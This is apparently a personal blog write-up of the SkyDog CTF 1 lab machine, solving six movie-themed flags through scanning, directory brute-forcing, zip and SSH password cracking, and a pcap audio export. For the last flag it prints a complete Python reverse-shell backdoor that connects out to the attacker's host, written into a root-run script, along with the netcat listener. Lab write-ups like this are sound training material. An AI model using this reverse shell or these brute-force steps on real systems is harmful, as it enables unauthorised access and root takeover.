---
layout: post
title:  "Hacking SkyDogCTF vulnOS" 
subtitle: "The answer to who let the dogs out"
categories: [itsec]
---

Another day, another vulnerable OS. Well, not really that often, but these days I enjoy it to solve them after work. Nice to get other thoughts and to relax. This time I'm doing **SkyDog CTF 1**. It has six flags included with a hint for each of them. They are MD5 hashes which obviously need to be cracked then :smile:

![](https://i.imgur.com/pqOugFL.jpg)


Table of contents

* Will be replaced with the ToC, excluding the "Contents" header
{:toc}


## Hints

The hints are these:

- Flag #1 Home Sweet Home or (A Picture is Worth a Thousand Words)
- Flag #2 When do Androids Learn to Walk?
- Flag #3 Who Can You Trust?
- Flag #4 Who Doesn’t Love a Good Cocktail Party?
- Flag #5 Another Day at the Office
- Flag #6 Little Black Box

## Flag #1

The first task is to discover the machine and search for open ports (I discovered it before at this IP):

	root@kali:~# nmap -T4 -sV -O 192.168.1.101

```bash
Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-25 21:52 CEST
Nmap scan report for 192.168.1.101
Host is up (0.00028s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 08:00:27:EF:0B:15 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.37 seconds
```

Port 22 is at a first view boring as it doesn't show a banner, just prompts for password. Port 80 looks more promising.

The page just shows that:

![](https://i.imgur.com/7sL9IQ1.png)

Looking at the source:

	<html>
	<img src=SkyDogCon_CTF.jpg>
	</html>

So the focus gets more at the image. Remember the first hint:

> Home Sweet Home or (A Picture is Worth a Thousand Words)

Let's download the image and do a first look at it:

	root@kali:~/Downloads# file SkyDogCon_CTF.jpeg 
	SkyDogCon_CTF.jpeg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=7, software=Adobe ImageReady], baseline, precision 8, 900x525, frames 3

Looks like a "real" JPEG picture. Check for EXIF data (sorry, I am using a German version):

	root@kali:~/Downloads# exif SkyDogCon_CTF.jpeg 
	EXIF-Markierungen in »SkyDogCon_CTF.jpeg« (Byte-Reihenfolge »Motorola«):
	--------------------+----------------------------------------------------------
	Markierung          |Wert
	--------------------+----------------------------------------------------------
	Software            |Adobe ImageReady
	XP-Kommentar        |flag{abc40a2d4e023b42bd1ff04891549ae2}
	Auffüllung          |2060 Byte unbekannte Daten
	Auflösung in X-Richt|72
	Auflösung in Y-Richt|72
	Maßeinheit der Auflö|Zoll
	Auffüllung          |2060 Byte unbekannte Daten
	Exif-Version        |Exif-Version 2.1
	FlashPixVersion     |FlashPix-Version 1.0
	Farbraum            |Interner Fehler (unbekannter Wert 65535)
	--------------------+----------------------------------------------------------

Here we have the first flag:

> flag{abc40a2d4e023b42bd1ff04891549ae2}

Let's see if we can crack it (it's MD5), I used [Hashkiller](https://hashkiller.co.uk/md5-decrypter.aspx) here which is a web based dictionary look-up. It resolves then to: "*Welcome[space]Home*" 

## Flag #2

The second flag was kinda easy to obtain, too. The hint was:

> When do Androids Learn to Walk?

After a bit thinking I thought of a "*robots.txt*", the file which crawlers should mention to control their behavior specially for a website, like excluding folders from being crawled. It's located inside the root folder of a website. And, **BAZINGA**, in the first line was flag #2: 

> flag{cd4f10fcba234f0e8b2f60a490c306e6}

It resolves to "**Bots**".

## Flag #3

The difficulty goes up a bit. The hint is:

> Who Can You Trust?

I thought a good start was the *robots.txt* as there was the last flag included. It shows some directories, so why not just crawl them? I added the list to a new text file, removing the *Allow/Disallow*, but I kept the leading ```/```. Let's run it in [dirsearch](https://github.com/maurosoria/dirsearch):

	root@kali:~/dirsearch# ./dirsearch.py -u http://192.168.1.101 -e php -w /root/Cracking/skydog_dirlist.txt -x 403

	 _|. _ _  _  _  _ _|_    v0.3.6
	(_||| _) (/_(_|| (_| )
	
	Extensions: php | Threads: 10 | Wordlist size: 299
	
	Error Log: /root/dirsearch/logs/errors-16-06-28_21-46-28.log
	
	Target: http://192.168.1.101
	
	[21:46:28] Starting: 
	[21:46:28] 200 -   43B  - /index.html
	[21:46:28] 200 -   43B  - /?hl=
	[21:46:28] 200 -   43B  - /
	[21:46:28] 200 -   43B  - /?hl=%2A&gws_rd=ssl$
	[21:46:28] 200 -   43B  - /?hl=%2A&
	[21:46:28] 200 -   43B  - /?pt1=true$
	[21:46:28] 200 -   43B  - /?hl=%2A&%2A&gws_rd=ssl
	[21:46:28] 200 -   43B  - /?gws_rd=ssl$
	[21:46:29] 200 -  541B  - /Setec/
	
	Task Completed

The last line shows us that we found a directory: ```/Setec/```. Navigating to it shows that:

![Too many secrets](https://i.imgur.com/KrTrO49.png)

The picture is in directory ```Astronomy/```, it has indexing enabled. Here we find a **.zip** file: *Whistler.zip*.

	root@kali:~/Downloads# file Whistler.zip 
	Whistler.zip: Zip archive data, at least v1.0 to extract

It's password protected and I'm using [that](http://weakpass.com/list/1187) list to crack it. It has a good ratio for cracking passwords.

```
root@kali:~/Downloads# fcrackzip -D -p /root/Cracking/passwords_collection.txt -u -v Whistler.zip 
found file 'flag.txt', (size cp/uc     50/    38, flags 9, chk 874a)
found file 'QuesttoFindCosmo.txt', (size cp/uc     72/    61, flags 9, chk 83b5)
checking pw yd0ntumak3m3                            

PASSWORD FOUND!!!!: pw == yourmother
```

Unpacking it gives us the files with these contents:

```
root@kali:~/Downloads# cat flag.txt 
flag{1871a3c1da602bf471d3d76cc60cdb9b}
root@kali:~/Downloads# cat QuesttoFindCosmo.txt 
Time to break out those binoculars and start doing some OSINT
```

So we have the next flag:

> flag{1871a3c1da602bf471d3d76cc60cdb9b}

It resolves to "**yourmother**".

## Flag #4

As the CTF is based on one of the best hacker movies "[Sneakers](http://www.imdb.com/title/tt0105435/)" I searched for the script of the movie.  As the last hint was to use *OSINT* I am parsing it with [CeWL](https://digi.ninja/projects/cewl.php), it's already comes with Kali Linux. The Ruby script crawls a website and searches for unique words to put them in a wordlist.

So I parsed the movie script:

```
root@kali:~/Downloads# cewl --depth=1 http://www.thealmightyguru.com/Reviews/Sneakers/Docs/Sneakers-Script.txt -w sneakers_script.txt
CeWL 5.1 Robin Wood (robin@digi.ninja) (http://digi.ninja)
```

A list with many words is created now. Let's use it for dirbusting:

```
# ./dirsearch.py -u "http://192.168.1.101/" -w /root/Downloads/sneakers_script.txt -e php -x 403

 _|. _ _  _  _  _ _|_    v0.3.6
(_||| _) (/_(_|| (_| )

Extensions: php | Threads: 10 | Wordlist size: 3739

Error Log: /root/Tools/dirsearch/logs/errors-16-07-24_18-02-24.log

Target: http://192.168.1.101/

[18:02:24] Starting: 
[18:02:24] 301 -  313B  - /Setec  ->  http://192.168.1.101/Setec/
[18:02:27] 301 -  319B  - /PlayTronics  ->  http://192.168.1.101/PlayTronics/

Task Completed
```

We know the first directory already, so let's focus on the second "**PlayTronics**".

```
 Index of /PlayTronics
   [PARENTDIR] Parent Directory   -
   [ ] companytraffic.pcap 2015-09-18 12:57 596K
   [TXT] flag.txt 2015-09-18 17:36 38
```

**flag.txt** contains:

> flag{c07908a705c22922e6d416e0e1107d99}

It resolves to "**leroybrown**".

## Flag #5

Let's dive into the pcap from the last flag. At the end is plain HTTP traffic. We see there that an audio file got downloaded:

![](https://i.imgur.com/aR1eTQN.png)

We could try to download it from the URI or try to reassemble it from the packet capture as the hole TCP stream is included.

Click "**File**" -> "**Export objects**" -> "**HTTP**" in Wireshark, the ```audio/mp3``` file will be shown. Export it as *.mp3*.

Let's listen to it.

> Hi, my name is Werner Brandes. My voice is my password. Verify me.

It's from that scene:

<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }</style><div class='embed-container'><iframe src='https://www.youtube.com/embed/-zVgWpVXb64' frameborder='0' allowfullscreen></iframe></div>

It's the next hint. I think we are about to get access to that machine, so let's build a list for usernames:

```
# cat usernames.txt 
root
admin
werner
brandes
wernerbrandes
werner.brandes
Werner
Brandes
WernerBrandes
Werner.Brandes
brandeswerner
BrandesWerner
brandes.werner
Werner
Brandes
r00t
leroybrown
PlayTronics
```

As passwords I am using the built wordlist from the script and appending "*leroybrown*" there. Let's start and crossing fingers that no anti bruteforce is in action:

```
# patator ssh_login host=192.168.1.101 port=22 user=FILE0 password=FILE1 0=usernames.txt 1=sneakers_script.txt -x ignore:mesg='Authentication failed.' -t 14
19:36:51 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2016-07-24 19:36 CEST
19:36:51 patator    INFO -                                                                              
19:36:51 patator    INFO - code  size   time | candidate                          |   num | mesg
19:36:51 patator    INFO - -----------------------------------------------------------------------------
19:38:01 patator    INFO - 0     39    0.009 | wernerbrandes:leroybrown           |   200 | SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
```

We got a hit, let's login with **wernerbrandes:leroybrown** and look around:

```
root@kali:~/Downloads# ssh wernerbrandes@192.168.1.101
wernerbrandes@192.168.1.101's password: 
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Jul 24 13:38:01 EDT 2016

  System load:  0.0               Processes:           113
  Usage of /:   7.3% of 17.34GB   Users logged in:     0
  Memory usage: 6%                IP address for eth0: 192.168.1.101
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

30 packages can be updated.
21 updates are security updates.

Last login: Fri Oct 30 19:08:28 2015 from 10.0.2.5
wernerbrandes@skydogctf:~$ ls -al
total 32
drwxr-xr-x 3 wernerbrandes wernerbrandes 4096 Oct 30  2015 .
drwxr-xr-x 4 root          root          4096 Sep 18  2015 ..
-rw------- 1 wernerbrandes wernerbrandes    0 Oct 30  2015 .bash_history
-rw-r--r-- 1 wernerbrandes wernerbrandes  220 Sep 18  2015 .bash_logout
-rw-r--r-- 1 wernerbrandes wernerbrandes 3637 Sep 18  2015 .bashrc
drwx------ 2 wernerbrandes wernerbrandes 4096 Sep 18  2015 .cache
-rw-r--r-- 1 nemo          nemo            38 Sep 18  2015 flag.txt
-rw-r--r-- 1 wernerbrandes wernerbrandes  675 Sep 18  2015 .profile
-rw-rw-r-- 1 wernerbrandes wernerbrandes   66 Oct 25  2015 .selected_editor
wernerbrandes@skydogctf:~$ cat flag.txt 
flag{82ce8d8f5745ff6849fa7af1473c9b35}wernerbrandes@skydogctf:~$ 
wernerbrandes@skydogctf:~$ 
```

So flag number 5 is:

> flag{82ce8d8f5745ff6849fa7af1473c9b35}

It resolves to "**Dr. Gunter Janek**".

BTW, did you mention the different username who owns the flag? **nemo**

## Flag #6

Let's resolve the last flag. The hint is "Little Black Box". A black box is a closed system where the inner contents are not known (kinda). Hmm.

I did ```find / -writable -type f``` to find all writeable files, it's quite a long list. After reviewing it I found an interesting file "**/lib/log/sanitizer.py**". Let's look what's inside of it:

```python
wernerbrandes@skydogctf:/$ cat /lib/log/sanitizer.py 
#!/usr/bin/env python
import os
import sys
try:
	os.system('rm -r /tmp/* ')
except:
	sys.exit()
```

It tries to flush the temporary file folder. 

```
wernerbrandes@skydogctf:/lib/log$ ls -al
total 12
drwxr-xr-x  2 root root 4096 Sep 18  2015 .
drwxr-xr-x 22 root root 4096 Sep 18  2015 ..
-rwxrwxrwx  1 root root   96 Oct 27  2015 sanitizer.py
```

It's own by root. Hmm. Maybe it's started by root periodically? Let's change the file a bit:

According to [that page](https://haiderm.com/simple-python-fully-undetectable-fud-reverse-shell-backdoor/) I pasted some code in it:

```python
#!/usr/bin/env python
#import os
#import sys
#try:
#	os.system('rm -r /tmp/* ')
#except:
#	sys.exit()

import socket,subprocess
HOST = '192.168.1.1'    # The remote host
PORT = 443            # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to attacker machine
s.connect((HOST, PORT))
# send we are connected
s.send('[*] Connection Established!')
# start loop
while 1:
     # recieve shell command
     data = s.recv(1024)
     # if its quit, then break out and close socket
     if data == "quit": break
     # do shell command
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     # read output
     stdout_value = proc.stdout.read() + proc.stderr.read()
     # send output to attacker
     s.send(stdout_value)
# close socket
s.close()
```

And then listened to it:

```
root@kali:~/Downloads# nc -lvn -p 443 -s 192.168.1.1
listening on [192.168.1.1] 443 ...
connect to [192.168.1.1] from (UNKNOWN) [192.168.1.101] 51994
[*] Connection Established!
whoami
root
hostname
skydogctf
cd /root
ls
BlackBox
ls /root/BlackBox 
flag.txt
cat /root/BlackBox/flag.txt
flag{b70b205c96270be6ced772112e7dd03f}

Congratulations!! Martin Bishop is a free man once again!  Go here to receive your reward.
/CongratulationsYouDidIt^C
```

So flag number 6 is

> flag{b70b205c96270be6ced772112e7dd03f}

It resolves to "**CongratulationsYouDidIt**".

The folder on the webserver contains a video *You're the best... around!.mp4*. 

Okay

## Conclusion

It was a really nice CTF. Kinda easy, but nice. I liked the OPSEC part to gain more info about the target. The reference to the movie was made very nice, too. There where many of them, I watched the movie again (you should do that, too) and resolved some of the riddles then. I want more like that!

What could be done better is to name the flags, at the beginning I did not know which flag I found.